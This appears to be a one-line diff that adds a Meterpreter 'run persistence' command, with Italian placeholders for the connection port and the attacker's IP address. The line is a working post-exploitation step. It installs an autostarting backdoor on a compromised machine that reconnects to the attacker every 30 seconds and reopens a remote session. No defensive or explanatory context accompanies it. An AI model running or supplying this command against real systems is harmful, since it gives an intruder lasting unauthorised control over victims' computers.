@@ -1,0 +1,1 @@
+run persistence -A -U -i 30 -p [porta_per_la_connessione] -r [indirizzo_ip_attacker]
